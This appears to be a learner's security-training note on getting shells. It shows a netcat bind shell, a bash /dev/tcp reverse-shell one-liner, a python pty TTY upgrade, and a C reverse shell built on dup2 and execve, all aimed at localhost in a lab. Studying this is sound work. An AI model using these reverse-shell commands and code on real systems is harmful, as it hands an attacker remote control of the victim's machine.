# Day 2 — Shells

## What this day is about
Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control, wanna run commands, move files, pivot. This day covers the two main shell types and how to upgrade a dumb shell to a fully interactive one.

---

## Bind Shell vs Reverse Shell

**Bind shell**: the victim listens, you connect to it.
- Victim runs a listener and waits
- You connect to it using the victim's IP and port
- Ion know but i think this rarely works in real engagements, most times, firewalls block inbound connections

**Reverse shell**: you listen, the victim connects back to you.
- You set up the listener on your machine
- Victim reaches out to you
- Works because outbound connections are almost never blocked

---

## Bind Shell with Netcat

```bash
# Victim
nc -nvlp 4444 -e /bin/bash

# Attacker
nc 127.0.0.1 4444
```

<img width="389" height="121" alt="image" src="https://github.com/user-attachments/assets/dfbda52d-55e3-44db-a796-5c2e63ad43a9" />
 

**[Fig 1: Victim terminal: nc -nvlp 4444 listening and receiving connection]**

<img width="620" height="120" alt="image" src="https://github.com/user-attachments/assets/8362dde5-5251-4b90-afa0-969fcf842b57" />

**[Fig 2: Attacker terminal: id command output with full uid/groups]**

---

## Reverse Shell with Netcat

```bash
# Attacker (listens first)
nc -nvlp 4444

# Victim (calls back)
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

**Important — zsh doesn't support /dev/tcp.** My default shell is zsh and running the command directly in zsh fails with `no such file or directory`. Always invoke bash explicitly with `bash -c '...'`.

<img width="614" height="79" alt="image" src="https://github.com/user-attachments/assets/52288478-e388-42d0-b1b6-101a81de356c" />

**[Fig 3: zsh error: no such file or directory: /dev/tcp/127.0.0.1/4444]**

Once you call bash explicitly it works:

<img width="1318" height="123" alt="image" src="https://github.com/user-attachments/assets/4477155f-83dc-4259-9a39-05c009cca5e0" />

**[Fig 4: both terminals: listener got connection, victim ran bash -c command]**

Running commands through the reverse shell:

<img width="641" height="182" alt="Screenshot 2026-04-28 134821" src="https://github.com/user-attachments/assets/6b51e850-a19f-43b1-a02d-bc7e7c9f5ca6" />

**[Fig 5: id and whoami responses coming back through the shell]**

---

## TTY Upgrade

A raw netcat shell is dumb, it has no tab completion, no arrow keys, Ctrl+C kills the whole session, sudo won't work. Upgrading to a full TTY fixes all of that.

```bash
# Step 1 — run inside the reverse shell (the nc listener terminal)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Ctrl+Z to background the shell

# Step 3 — run on your LOCAL terminal
stty raw -echo; fg

# Step 4 — press Enter twice, then run inside the shell
export TERM=xterm
```

**Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed, inside the nc listener terminal.

<img width="459" height="352" alt="image" src="https://github.com/user-attachments/assets/23335498-7562-4af4-8e26-cd10fcee1769" />

**[Fig 6: hostnamepython3: command not found error]**

After running it correctly inside the reverse shell, the prompt changed to a full bash prompt and the TTY upgrade worked.

---

## C Reverse Shell

The repo includes `shell.c` a raw C reverse shell. Compiled and ran it to see what a shell looks like when it comes from a binary instead of a bash one-liner.

```bash
gcc -o shell shell.c
./shell 127.0.0.1 4444
```

<img width="667" height="282" alt="Screenshot 2026-05-13 141801" src="https://github.com/user-attachments/assets/cc156e48-6dd5-49f4-aaee-72c8e3a10242" />

**[Fig 7: gcc compile and ./shell 127.0.0.1 4444 running]**

<img width="640" height="189" alt="Screenshot 2026-05-13 141710" src="https://github.com/user-attachments/assets/082a1ef2-93b2-4411-91d2-76a8deb9bca3" />

**[Fig 8: listener received connection, id output came back]**

How it works under the hood:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);       // create TCP socket
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));  // connect to attacker

for (int i = 0; i < 3; i++) {
    dup2(sockfd, i);  // redirect stdin(0), stdout(1), stderr(2) to socket
}

execve("/bin/sh", NULL, NULL);  // replace process with a shell
```

`dup2` rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` no netcat needed on the victim side, just the binary.

---

## Key Takeaways

- Reverse shells over bind shells bro, always🙃
- `/dev/tcp` is bash-only; zsh, sh, and dash don't support it
- Raw nc shells are not interactive, therefore always upgrade with python3 pty
- TTY upgrade commands go inside the reverse shell, not your local terminal

---

